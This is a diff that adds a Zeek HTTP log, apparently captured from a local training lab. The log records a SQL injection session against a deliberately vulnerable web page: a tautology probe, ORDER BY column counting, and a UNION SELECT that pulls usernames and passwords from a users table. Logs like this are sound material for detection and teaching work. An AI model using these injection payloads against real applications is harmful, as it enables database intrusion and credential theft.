@@ -1,0 +1,14 @@
+#separator \x09
+#set_separator	,
+#empty_field	(empty)
+#unset_field	-
+#path	http
+#open	2026-11-16-12-21-24
+#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	trans_depth	method	host	uri	referrer	version	user_agent	origin	request_body_len	response_body_len	status_code	status_msg	info_code	info_msg	tags	username	password	proxied	orig_fuids	orig_filenames	orig_mime_types	resp_fuids	resp_filenames	resp_mime_types
+#types	time	string	addr	port	addr	port	count	string	string	string	string	string	string	string	count	count	count	string	count	string	set[enum]	string	string	set[string]	vector[string]	vector[string]	vector[string]	vector[string]	vector[string]	vector[string]
+1794849515.676610	CW6CI51OSlJoe96LPi	127.0.0.1	50534	127.0.0.1	8080	1	GET	127.0.0.1:8080	/vulnerabilities/sqli/?id=1&Submit=Submit	http://127.0.0.1:8080/vulnerabilities/sqli/	1.1	Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0	-	0	4538	200	OK	-	-	(empty)	-	-	-	-	-	-	FukPVn3Sc33hF3KQj7	-	text/html
+1794849548.953253	CvGkR41LuDDk9mymhl	127.0.0.1	60324	127.0.0.1	8080	1	GET	127.0.0.1:8080	/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit	http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit	1.1	Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0	-	0	4826	200	OK	-	-	(empty)	-	-	-	-	-	-	FbOcir3eN0bWDyRXp5	-	text/html
+1794849567.884782	COMoBI2X4ryYOBPr78	127.0.0.1	49992	127.0.0.1	8080	1	GET	127.0.0.1:8080	/vulnerabilities/sqli/?id=1'+ORDER+BY+2--+-&Submit=Submit	http://127.0.0.1:8080/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit	1.1	Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0	-	0	4554	200	OK	-	-	(empty)	-	-	-	-	-	-	FVX3Z61hGxLmMlch4f	-	text/html
+1794849578.875882	CExODl1iW3T0oLTjY9	127.0.0.1	40214	127.0.0.1	8080	1	GET	127.0.0.1:8080	/vulnerabilities/sqli/?id=1'+ORDER+BY+3--+-&Submit=Submit	http://127.0.0.1:8080/vulnerabilities/sqli/?id=1%27+ORDER+BY+2--+-&Submit=Submit	1.1	Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0	-	0	47	200	OK	-	-	(empty)	-	-	-	-	-	-	FMp3i14iNFs8E2htr9	-	text/plain
+1794849607.511128	C3M5Lq3H60LVriBXCf	127.0.0.1	51776	127.0.0.1	8080	1	GET	127.0.0.1:8080	/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,+password+FROM+users--+-&Submit=Submit	http://127.0.0.1:8080/vulnerabilities/sqli/?id=1%27+ORDER+BY+2--+-&Submit=Submit	1.1	Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0	-	0	5234	200	OK	-	-	(empty)	-	-	-	-	-	-	Fvv1yfBVGTBnjjlN	-	text/html
+#close	2026-11-16-12-21-24
